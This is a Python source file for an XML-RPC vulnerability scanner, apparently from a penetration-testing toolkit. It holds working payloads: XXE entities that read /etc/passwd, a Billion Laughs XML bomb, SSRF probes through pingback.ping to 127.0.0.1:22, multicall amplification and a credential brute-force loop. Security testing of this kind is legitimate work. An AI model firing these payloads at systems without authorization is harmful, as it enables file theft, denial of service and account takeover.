import xmlrpc.client
import re
import os
import time
from ptlibs.ptprinthelper import ptprint


class XmlRpcScanner:
    def __init__(self, session, args, ptjsonlib):
        self.session = session
        self.args = args
        self.jsonlib = ptjsonlib
        self.node_key = None
        self.metadata = {}
        self.discovered_methods = []

    def run(self):
        self.extract_api_details()

        node_properties = {"url": self.args.url}
        if self.metadata:
            node_properties["api_schema"] = self.metadata

        node = self.jsonlib.create_node_object("xmlrpc_api", node_properties)
        self.node_key = node.get("key")
        self.jsonlib.add_node(node)

        if not self.args.url.lower().startswith("https"):
            self.jsonlib.add_vulnerability("PTV-GEN-INSECURE-TRANSPORT",
                                           node_key=self.node_key)
            ptprint("Insecure Transport (HTTP).", "VULN",
                    condition=not self.args.json, colortext=True)

        if self.metadata:
            evidence = f"Exposed {len(self.discovered_methods)} methods: "
            evidence += ", ".join(self.discovered_methods[:15])
            if len(self.discovered_methods) > 15:
                evidence += f"... (+{len(self.discovered_methods) - 15} more)"
            self.jsonlib.add_vulnerability("PTV-RPC-INTROSPECTION-ENABLED",
                                           node_key=self.node_key,
                                           data={"evidence": evidence})

        self.test_xxe()
        self.test_brute_force()
        self.test_information_disclosure()
        self.test_type_confusion()
        self.test_xml_bomb()
        self.test_ssrf_pingback()
        self.test_multicall_amplification()
        self.test_security_headers()
        self.test_rate_limiting()

    # =========================================================================
    # API Schema Extraction
    # =========================================================================

    def extract_api_details(self):
        ptprint("Performing API schema extraction...", "INFO",
                condition=not self.args.json)
        try:
            server = xmlrpc.client.ServerProxy(self.args.url, verbose=False)
            self.discovered_methods = server.system.listMethods()

            for method in self.discovered_methods:
                method_info = {"signature": "N/A", "help": "N/A"}
                try:
                    method_info["signature"] = server.system.methodSignature(method)
                except Exception:
                    pass
                try:
                    method_info["help"] = server.system.methodHelp(method)
                except Exception:
                    pass
                self.metadata[method] = method_info

            if self.discovered_methods:
                ptprint(f"Extracted {len(self.discovered_methods)} method(s).",
                        "VULN", condition=not self.args.json, colortext=True)
            else:
                ptprint("Introspection returned no methods.", "INFO",
                        condition=not self.args.json)

        except xmlrpc.client.Fault as e:
            ptprint(f"Introspection rejected (Fault: {e.faultString}).",
                    "INFO", condition=not self.args.json)
        except Exception as e:
            ptprint(f"Introspection failed: {type(e).__name__}",
                    "INFO", condition=not self.args.json)

    def test_xxe(self):
        ptprint("Testing for XXE vulnerability...", "INFO",
                condition=not self.args.json)

        payloads = [
            {
                "name": "file:///etc/passwd",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<methodCall><methodName>&xxe;</methodName></methodCall>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "file:///etc/passwd (in param)",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<methodCall><methodName>system.listMethods</methodName>'
                    '<params><param><value>&xxe;</value></param></params>'
                    '</methodCall>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
        ]

        for p in payloads:
            try:
                r = self.session.post(self.args.url, data=p["data"],
                                      headers={"Content-Type": "text/xml"},
                                      timeout=self.args.timeout, verify=False)
                for indicator in p["indicators"]:
                    if indicator in r.text:
                        snippet = r.text[:200].strip().replace('\n', ' ')
                        ptprint(f"XXE vulnerability detected ({p['name']})!",
                                "VULN", condition=not self.args.json, colortext=True)
                        self.jsonlib.add_vulnerability(
                            "PTV-XML-XXE", node_key=self.node_key,
                            data={"evidence": f"Payload: {p['name']}. Snippet: {snippet}"})
                        return
            except Exception:
                continue

        ptprint("Server appears safe from XXE.", "OK",
                condition=not self.args.json)

    def test_brute_force(self):
        login_patterns = ["login", "auth", "signin", "authenticate",
                          "wp.getUsersBlogs", "wp.getProfile"]

        auth_methods = [m for m in self.discovered_methods
                        if any(pat in m.lower() for pat in login_patterns)]

        if not auth_methods:
            ptprint("No authentication methods detected. Skipping brute force.",
                    "INFO", condition=not self.args.json)
            return

        ptprint(f"Testing brute force on: {', '.join(auth_methods)}",
                "INFO", condition=not self.args.json)

        server = xmlrpc.client.ServerProxy(self.args.url, verbose=False)

        base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
        passwords = self._load_wordlist(
            os.path.join(base_dir, "wordlist.txt"),
            fallback=["123456", "password", "admin123", "root", "test"]
        )
        usernames = self._load_wordlist(
            os.path.join(base_dir, "usernames.txt"),
            fallback=["admin", "root", "user", "test"]
        )

        attempts = []
        for auth_method in auth_methods:
            for user in usernames:
                for pwd in passwords:
                    try:
                        is_success = False
                        if "wp." in auth_method:
                            resp = getattr(server, auth_method)(user, pwd)
                            is_success = isinstance(resp, list) and len(resp) > 0
                        else:
                            resp = getattr(server, auth_method)(user, pwd)
                            if isinstance(resp, dict):
                                is_success = resp.get("status") in ["ok", "success", True]
                            elif isinstance(resp, bool):
                                is_success = resp
                            elif isinstance(resp, str):
                                is_success = resp.lower() in ["ok", "success", "true"]

                        if is_success:
                            ptprint(f"Brute force success: {user}:{pwd} via {auth_method}",
                                    "VULN", condition=not self.args.json, colortext=True)
                            self.jsonlib.add_vulnerability(
                                "PTV-RPC-BRUTEFORCE-SUCCESS",
                                node_key=self.node_key,
                                data={"evidence": f"Valid credentials via {auth_method}: "
                                                  f"{user}:{pwd}. Attempts: {len(attempts)}"})
                            return
                        else:
                            attempts.append(f"{user}:{pwd}")

                    except xmlrpc.client.Fault:
                        attempts.append(f"{user}:{pwd}")
                    except Exception:
                        continue

        ptprint(f"Brute force completed ({len(attempts)} attempts), no valid credentials.",
                "INFO", condition=not self.args.json)

    def test_information_disclosure(self):
        ptprint("Testing for information disclosure...", "INFO",
                condition=not self.args.json)

        test_inputs = [
            ("Invalid XML", "<invalid_xml/>"),
            ("Malformed method call", '<?xml version="1.0"?><methodCall><BROKEN'),
            ("Non-existent method", (
                '<?xml version="1.0"?>'
                '<methodCall><methodName>nonexistent.method.12345</methodName></methodCall>'
            )),
        ]

        found_vulns = []

        for name, data in test_inputs:
            try:
                r = self.session.post(self.args.url, data=data,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=self.args.timeout, verify=False)
            except Exception:
                continue

            body = r.text
            body_lower = body.lower()

            linux_path_re = r"/(?:var|etc|home|usr|tmp|app|opt|srv|bin|lib|root)(?:/[a-zA-Z0-9._-]+)+"
            windows_path_re = r"[a-zA-Z]:\\(?:[^\\\/:*?\"<>|\r\n]+\\)+"
            path_match = re.search(linux_path_re, body) or re.search(windows_path_re, body)
            if path_match and len(path_match.group(0)) > 8:
                found_vulns.append(("PTV-GEN-PATH-LEAK",
                                    f"Trigger: {name}. Path: {path_match.group(0)}"))

            verbose_patterns = [
                "stack trace", "traceback", "php on line", "syntax error",
                "parse error", "warning:", "notice:", "exception",
                "at line", "unhandled", "debug", "internal server error",
                "nullreferenceexception", "object reference",
            ]
            matched = [p for p in verbose_patterns if p in body_lower]
            if matched:
                snippet = body[:200].strip().replace('\n', ' ')
                found_vulns.append(("PTV-RPC-VERBOSE-ERRORS",
                                    f"Trigger: {name}. Patterns: {matched}. Snippet: {snippet}"))

            for header in ["Server", "X-Powered-By", "X-AspNet-Version"]:
                val = r.headers.get(header, "")
                if val:
                    found_vulns.append(("PTV-RPC-TECH-DISCLOSURE",
                                        f"Header '{header}: {val}'"))

        reported = set()
        for code, evidence in found_vulns:
            if code not in reported:
                reported.add(code)
                ptprint(f"Information disclosure: {code}", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(code, node_key=self.node_key,
                                               data={"evidence": evidence})

        if not found_vulns:
            ptprint("No information disclosure detected.", "OK",
                    condition=not self.args.json)

    def test_type_confusion(self):
        ptprint("Testing for type confusion...", "INFO",
                condition=not self.args.json)

        if not self.discovered_methods:
            ptprint("No methods available for type confusion test.", "INFO",
                    condition=not self.args.json)
            return

        test_methods = [m for m in self.discovered_methods
                        if not m.startswith("system.")][:3]
        if not test_methods:
            test_methods = self.discovered_methods[:1]

        type_payloads = [
            ("boolean", "<boolean>1</boolean>"),
            ("array", "<array><data><value>1</value><value>2</value></data></array>"),
            ("struct", "<struct><member><name>x</name><value>1</value></member></struct>"),
            ("double", "<double>3.14159</double>"),
        ]

        found_confusion = False
        for method in test_methods:
            for type_name, type_xml in type_payloads:
                payload = (
                    f"<?xml version='1.0'?>"
                    f"<methodCall><methodName>{method}</methodName>"
                    f"<params><param><value>{type_xml}</value></param></params>"
                    f"</methodCall>"
                )
                try:
                    r = self.session.post(self.args.url, data=payload,
                                          headers={"Content-Type": "text/xml"},
                                          timeout=self.args.timeout, verify=False)
                except Exception:
                    continue

                error_patterns = [
                    "traceback", "exception", "line ", "typeerror",
                    "valueerror", "attributeerror", "keyerror",
                    "fatal error", "stack trace", "php on line",
                ]

                if any(pat in r.text.lower() for pat in error_patterns):
                    snippet = r.text[:150].strip().replace('\n', ' ')
                    ptprint(f"Type confusion error: {method} with {type_name}!",
                            "VULN", condition=not self.args.json, colortext=True)
                    self.jsonlib.add_vulnerability(
                        "PTV-GEN-TYPE-CONFUSION-VERBOSE",
                        node_key=self.node_key,
                        data={"evidence": f"Method: {method}, Type: {type_name}. "
                                          f"Snippet: {snippet}"})
                    found_confusion = True
                    break

            if found_confusion:
                break

        if not found_confusion:
            ptprint("Server handled type confusion securely.", "OK",
                    condition=not self.args.json)

    def test_xml_bomb(self):
        """Testuje odolnosť voči XML Bomb / Billion Laughs útoku (DoS).

        Rovnaký princíp ako pri SOAP — zmenšený payload pre bezpečné testovanie.
        """
        ptprint("Testing XML Bomb (Billion Laughs) resistance...", "INFO",
                condition=not self.args.json)

        bomb_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '  <!ENTITY lol "lol">'
            '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            ']>'
            '<methodCall><methodName>&lol3;</methodName></methodCall>'
        )

        start_time = time.time()
        try:
            r = self.session.post(self.args.url, data=bomb_payload,
                                  headers={"Content-Type": "text/xml"},
                                  timeout=15, verify=False)
        except Exception:
            elapsed = time.time() - start_time
            if elapsed >= 14:
                ptprint("XML Bomb caused timeout — possible DoS vulnerability!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-XML-BOMB", node_key=self.node_key,
                    data={"evidence": f"Server timed out after {elapsed:.1f}s."})
            else:
                ptprint("XML Bomb test inconclusive.", "INFO",
                        condition=not self.args.json)
            return

        elapsed = time.time() - start_time
        body_lower = r.text.lower()

        rejection_indicators = [
            "entity", "expansion", "too many", "billion laughs",
            "dtd", "disallowed", "not allowed", "recursive",
        ]

        if any(ind in body_lower for ind in rejection_indicators):
            ptprint("Server correctly rejected entity expansion.", "OK",
                    condition=not self.args.json)
            return

        lol_count = r.text.count("lol")
        if lol_count > 20:
            ptprint(f"XML Bomb processed — entity expanded ({lol_count}x)!", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-XML-BOMB", node_key=self.node_key,
                data={"evidence": f"Expanded nested entities ({lol_count}x). "
                                  f"Response time: {elapsed:.1f}s."})
        elif elapsed > 5:
            ptprint(f"XML Bomb caused slow response ({elapsed:.1f}s)!", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-XML-BOMB", node_key=self.node_key,
                data={"evidence": f"Response time {elapsed:.1f}s. "
                                  "Possible entity expansion DoS."})
        else:
            ptprint("Server appears resistant to XML Bomb.", "OK",
                    condition=not self.args.json)

    def test_ssrf_pingback(self):
        """Testuje SSRF cez pingback.ping metódu (WordPress-špecifické).

        pingback.ping(sourceUri, targetUri) umožňuje serveru urobiť HTTP
        request na sourceUri — ak nie je validovaná, je to SSRF.

        Testuje aj všeobecné SSRF cez entity resolution.
        """
        ptprint("Testing for SSRF...", "INFO",
                condition=not self.args.json)

        if "pingback.ping" in self.discovered_methods:
            ptprint("  pingback.ping detected — testing SSRF...", "INFO",
                    condition=not self.args.json)

            pingback_payload = (
                '<?xml version="1.0"?>'
                '<methodCall>'
                '<methodName>pingback.ping</methodName>'
                '<params>'
                '<param><value><string>http://127.0.0.1:22</string></value></param>'
                '<param><value><string>http://127.0.0.1/</string></value></param>'
                '</params>'
                '</methodCall>'
            )

            try:
                start = time.time()
                r = self.session.post(self.args.url, data=pingback_payload,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=10, verify=False)
                elapsed = time.time() - start

                body_lower = r.text.lower()

                ssrf_indicators = [
                    "connection refused", "connection reset", "couldn't connect",
                    "cannot connect", "failed to connect", "no response",
                    "timed out", "unreachable",
                ]

                if any(ind in body_lower for ind in ssrf_indicators):
                    ptprint("SSRF via pingback.ping — server attempted internal connection!",
                            "VULN", condition=not self.args.json, colortext=True)
                    self.jsonlib.add_vulnerability(
                        "PTV-RPC-SSRF-PINGBACK", node_key=self.node_key,
                        data={"evidence": "pingback.ping to http://127.0.0.1:22 triggered "
                                          "connection attempt. Server can be used as SSRF proxy."})
                    return

                rejection = ["is not valid", "not allowed", "rejected", "disabled"]
                if not any(kw in body_lower for kw in rejection):
                    # Ak server akceptoval request bez chyby
                    if r.status_code == 200 and "fault" not in body_lower:
                        ptprint("SSRF via pingback.ping — request accepted without validation!",
                                "VULN", condition=not self.args.json, colortext=True)
                        self.jsonlib.add_vulnerability(
                            "PTV-RPC-SSRF-PINGBACK", node_key=self.node_key,
                            data={"evidence": "pingback.ping accepted internal URL without rejection. "
                                              "Server may be exploitable for SSRF."})
                        return

            except Exception:
                pass

            ptprint("pingback.ping not exploitable for SSRF.", "OK",
                    condition=not self.args.json)
        else:
            ssrf_payload = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://127.0.0.1:22">]>'
                '<methodCall><methodName>system.listMethods</methodName>'
                '<params><param><value>&ssrf;</value></param></params>'
                '</methodCall>'
            )

            try:
                r = self.session.post(self.args.url, data=ssrf_payload,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=10, verify=False)

                ssrf_hints = ["ssh-", "openssh", "connection refused",
                              "connection reset", "errno"]
                if any(h in r.text.lower() for h in ssrf_hints):
                    ptprint("SSRF via entity resolution detected!", "VULN",
                            condition=not self.args.json, colortext=True)
                    self.jsonlib.add_vulnerability(
                        "PTV-RPC-SSRF-PINGBACK", node_key=self.node_key,
                        data={"evidence": "Entity resolution to http://127.0.0.1:22 "
                                          "returned connection indicators."})
                    return
            except Exception:
                pass

            ptprint("No SSRF indicators detected.", "OK",
                    condition=not self.args.json)

    def test_multicall_amplification(self):
        """Testuje, či system.multicall je dostupný pre DDoS amplifikáciu.

        system.multicall umožňuje odoslať viacero metód v jednom requeste.
        Útočník môže zneužiť túto funkciu na amplifikáciu — jeden malý
        request spustí desiatky operácií na serveri.
        """
        ptprint("Testing system.multicall amplification...", "INFO",
                condition=not self.args.json)

        if "system.multicall" not in self.discovered_methods:
            ptprint("system.multicall not available.", "OK",
                    condition=not self.args.json)
            return
        calls = []
        for _ in range(10):
            calls.append(
                '<value><struct>'
                '<member><name>methodName</name>'
                '<value><string>system.listMethods</string></value></member>'
                '<member><name>params</name>'
                '<value><array><data></data></array></value></member>'
                '</struct></value>'
            )

        multicall_payload = (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>'
            + ''.join(calls) +
            '</data></array></value></param></params>'
            '</methodCall>'
        )

        try:
            r = self.session.post(self.args.url, data=multicall_payload,
                                  headers={"Content-Type": "text/xml"},
                                  timeout=self.args.timeout, verify=False)

            body_lower = r.text.lower()

            response_count = body_lower.count("<array>")

            if response_count >= 5:
                ptprint(f"system.multicall amplification possible ({response_count} responses)!",
                        "VULN", condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-RPC-MULTICALL-ABUSE", node_key=self.node_key,
                    data={"evidence": f"system.multicall executed {response_count} calls "
                                      "in single request. Can be abused for brute force "
                                      "amplification or DDoS."})
            elif "fault" in body_lower:
                ptprint("system.multicall is restricted.", "OK",
                        condition=not self.args.json)
            else:
                ptprint("system.multicall response inconclusive.", "INFO",
                        condition=not self.args.json)

        except Exception:
            ptprint("system.multicall test failed.", "INFO",
                    condition=not self.args.json)

    def test_security_headers(self):
        """Kontroluje prítomnosť bezpečnostných HTTP hlavičiek."""
        ptprint("Checking security headers...", "INFO",
                condition=not self.args.json)

        try:
            r = self.session.post(
                self.args.url,
                data='<?xml version="1.0"?><methodCall>'
                     '<methodName>system.listMethods</methodName></methodCall>',
                headers={"Content-Type": "text/xml"},
                timeout=self.args.timeout, verify=False)
        except Exception:
            ptprint("Could not complete security headers check.", "INFO",
                    condition=not self.args.json)
            return

        important_headers = {
            "Strict-Transport-Security": "HSTS — ochrana proti downgrade na HTTP",
            "Content-Security-Policy": "CSP — ochrana proti XSS",
            "X-Content-Type-Options": "Ochrana proti MIME type sniffing",
            "X-Frame-Options": "Ochrana proti clickjacking",
        }

        cors_header = r.headers.get("Access-Control-Allow-Origin", "")

        missing = []
        for header, desc in important_headers.items():
            if header not in r.headers:
                missing.append(f"{header} ({desc})")

        if missing or cors_header == "*":
            parts = []
            if missing:
                parts.append(f"Missing headers: {'; '.join(missing)}")
            if cors_header == "*":
                parts.append("CORS is wildcard (*) — allows any origin")

            ptprint(f"Missing security headers ({len(missing)} missing).", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-GEN-MISSING-HEADERS", node_key=self.node_key,
                data={"evidence": ". ".join(parts)})
        else:
            ptprint("Security headers present.", "OK",
                    condition=not self.args.json)

    def test_rate_limiting(self):
        ptprint("Testing rate limiting...", "INFO", condition=not self.args.json)

        request_count = 25
        codes = []
        probe = (
            "<?xml version='1.0'?>"
            "<methodCall><methodName>system.listMethods</methodName></methodCall>"
        )

        for _ in range(request_count):
            try:
                r = self.session.post(self.args.url, data=probe,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=5, verify=False)
                codes.append(r.status_code)
                if r.status_code == 429:
                    ptprint("Rate limiting is active (HTTP 429).", "OK",
                            condition=not self.args.json)
                    return
            except Exception:
                continue

        if codes:
            unique_codes = list(set(codes))
            ptprint(f"No rate limiting after {len(codes)} requests.",
                    "VULN", condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-GEN-NO-RATE-LIMIT", node_key=self.node_key,
                data={"evidence": f"Sent {len(codes)} requests. HTTP codes: {unique_codes}"})
        else:
            ptprint("Rate limit test inconclusive.", "INFO",
                    condition=not self.args.json)

    @staticmethod
    def _load_wordlist(path, fallback=None):
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    words = [line.strip() for line in f if line.strip()]
                if words:
                    return words
            except Exception:
                pass
        return fallback or []